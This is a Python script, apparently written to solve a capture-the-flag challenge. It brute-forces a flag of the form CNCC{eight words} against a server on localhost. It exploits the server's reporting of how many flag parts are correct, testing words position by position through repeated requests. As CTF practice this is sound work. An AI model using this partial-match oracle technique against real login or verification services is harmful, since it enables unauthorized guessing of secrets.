import requests
import json
import sys

# Server endpoint
SERVER_URL = "http://localhost:8080/check-flag"

# Paste your full word list as a triple-quoted string
word_string = """apple banana cloud stream hacker wire stone crystal gate iron matrix signal flame radar stealth vault dragon quantum circuit glitch phantom shadow mask echo spear agent frost spike neon hunter binary pulse venom cipher lock storm pixel fusion silent rogue blast freeze data swarm scale flare ninja brute wave flare vector orbit prism core shield strike blaze byte ghost sneak energy decrypt flux phase acid scan trace decode spark delta nova stealthy bug zero thunder shell ghostly token pirate stealthier crack digital stealthest poison scar crypt hash encoder spider malware traceback beast chaos beam signaler bruteify infect rage vapor glitchy botnet seed overflow bypass tracey bytecode jumper mutator stealthbot crawler inject intrude spam injecter crawl force strength relay stealthmode overclock tunnel firewall trap cloak burn gravity trapper silencer scanner breaker sentry snare snarebot disrupt confuse jammer rupture invade steal fake silentrun tracker sleuth decoy smoke worm crawlbot sniff sneakbot cyber leak breach capture nether trick lurker lockbot cloner parasite patch hackerbot signalbot detonate shift enigma roguewave spikeball deflect vortex drone clash warp server spoof cloaked silence defuse cracked crackedbot ignite splinter obfuscate crash corruption stealthcode zerobot bitmask decodebot keygen exfil replicate spread scramble cyberpath maskify invader cracker cloneware fuzz honeypot hook infector reroute failover fusebox mainframe cycler encryptor disabler armor seeker disguise buzz camo cloakify breakerbot trapdoor override nullbyte overrun gridlock byteforce bugbot sniffer control rampage erratic hijack backdoor codebreak reboot swarmbot fade desync loader demux gatekeeper shatter bytebomb doser"""

words = word_string.split()

def test_flag(flag):
    """Test a flag against the server"""
    try:
        payload = {"flag": flag}
        response = requests.post(SERVER_URL, 
                               headers={"Content-Type": "application/json"},
                               json=payload,
                               timeout=5)
        return response.json()
    except Exception as e:
        print(f"Error testing flag {flag}: {e}")
        return None

class EfficientBruteForcer:
    def __init__(self):
        self.known_parts = [None] * 8  # Track known correct parts
        self.tested_count = 0
        
    def create_flag_with_parts(self, parts):
        """Create a flag string from 8 parts"""
        return "CNCC{" + "_".join(parts) + "}"
    
    def test_word_in_all_positions(self, word):
        """Test a single word in all 8 positions to see if it belongs anywhere"""
        self.tested_count += 1
        if self.tested_count % 50 == 0:
            print(f"Tested {self.tested_count} words...")
        
        # Create flag with this word in all positions
        test_parts = [word] * 8
        flag = self.create_flag_with_parts(test_parts)
        result = test_flag(flag)
        
        if result:
            valid_parts = result.get('valid_parts', 0)
            if valid_parts > 0:
                print(f"WORD FOUND: '{word}' belongs in {valid_parts} position(s) - {flag}")
                return valid_parts
        
        return 0
    
    def find_word_positions(self, word, expected_count):
        """Find which specific positions this word belongs to"""
        print(f"Finding positions for word '{word}' (expected in {expected_count} positions)")
        
        positions = []
        # Test each position individually
        for pos in range(8):
            # Create test with word at this position, others as dummy
            test_parts = ["dummy"] * 8
            test_parts[pos] = word
            flag = self.create_flag_with_parts(test_parts)
            result = test_flag(flag)
            
            if result and result.get('valid_parts', 0) > 0:
                positions.append(pos)
                print(f"✅ '{word}' confirmed at position {pos}")
        
        return positions
    
    def brute_force_efficient(self):
        """Efficient brute force: test each word systematically"""
        print("Starting efficient brute force...")
        print(f"Testing each of {len(words)} words in all positions...")
        
        word_positions = {}  # word -> list of positions it belongs to
        
        # Phase 1: Find which words belong in the flag
        print("\nPhase 1: Finding words that belong in the flag...")
        
        for word in words:
            valid_count = self.test_word_in_all_positions(word)
            
            if valid_count > 0:
                print(f"Found word '{word}' appears {valid_count} times")
                # Find exact positions
                positions = self.find_word_positions(word, valid_count)
                if positions:
                    word_positions[word] = positions
                    
                    # Update known parts
                    for pos in positions:
                        self.known_parts[pos] = word
                    
                    print(f"Word '{word}' locked in positions: {positions}")
                    print(f"Current known parts: {self.known_parts}")
                    
                    # Check if we have all 8 positions filled
                    if all(part is not None for part in self.known_parts):
                        print("🎉 All positions found!")
                        flag = self.create_flag_with_parts(self.known_parts)
                        
                        # Verify the complete flag
                        result = test_flag(flag)
                        if result and result.get('valid', False):
                            print(f"🎉 VERIFIED COMPLETE FLAG: {flag}")
                            return result, self.known_parts
                        else:
                            print(f"❌ Complete flag verification failed: {flag}")
                            print("Continuing search...")
        
        print(f"\nPhase 1 complete. Found words: {word_positions}")
        print(f"Known parts: {self.known_parts}")
        
        # Check what positions are still unknown
        unknown_positions = [i for i in range(8) if self.known_parts[i] is None]
        
        if not unknown_positions:
            flag = self.create_flag_with_parts(self.known_parts)
            result = test_flag(flag)
            if result and result.get('valid', False):
                return result, self.known_parts
            else:
                print("❌ All positions filled but flag is invalid")
                return None
        
        print(f"Unknown positions remaining: {unknown_positions}")
        
        # Phase 2: If some positions are still unknown, brute force those
        if unknown_positions:
            print(f"\nPhase 2: Brute forcing {len(unknown_positions)} remaining positions...")
            
            # Try each remaining word in unknown positions
            remaining_words = [w for w in words if w not in word_positions]
            print(f"Trying {len(remaining_words)} remaining words in {len(unknown_positions)} positions...")
            
            from itertools import product
            
            # If few positions left, try all combinations
            if len(unknown_positions) <= 3:
                for combo in product(remaining_words, repeat=len(unknown_positions)):
                    test_parts = self.known_parts.copy()
                    for i, pos in enumerate(unknown_positions):
                        test_parts[pos] = combo[i]
                    
                    flag = self.create_flag_with_parts(test_parts)
                    result = test_flag(flag)
                    
                    if result and result.get('valid', False):
                        print(f"🎉 FOUND COMPLETE FLAG: {flag}")
                        return result, test_parts
                    elif result and result.get('valid_parts', 0) > len([p for p in self.known_parts if p is not None]):
                        print(f"Better combination found: {flag} -> {result.get('valid_parts')}/8")
            else:
                # Too many unknowns, try individual words
                for word in remaining_words:
                    for pos in unknown_positions:
                        test_parts = self.known_parts.copy()
                        test_parts[pos] = word
                        
                        flag = self.create_flag_with_parts(test_parts)
                        result = test_flag(flag)
                        
                        if result and result.get('valid_parts', 0) > len([p for p in self.known_parts if p is not None]):
                            print(f"Found improvement: position {pos} = '{word}'")
                            self.known_parts[pos] = word
                            unknown_positions.remove(pos)
                            break
        
        return None

if __name__ == "__main__":
    print("Starting efficient server-side brute force attack...")
    print(f"Server: {SERVER_URL}")
    print(f"Word list size: {len(words)}")
    
    # First test server connectivity
    test_result = test_flag("CNCC{test_test_test_test_test_test_test_test}")
    if test_result is None:
        print("❌ Cannot connect to server. Make sure it's running on localhost:8080")
        sys.exit(1)
    
    print(f"Server response for test flag: {test_result}")
    print(f"Total parts in flag: {test_result.get('total_parts', 'unknown')}")
    
    bruteforcer = EfficientBruteForcer()
    result = bruteforcer.brute_force_efficient()
    
    if result:
        flag = bruteforcer.create_flag_with_parts(result[1])
        print(f"✅ Final Flag: {flag}")
    else:
        print("❌ Could not find the complete flag.")
        print("Known parts so far:", bruteforcer.known_parts)
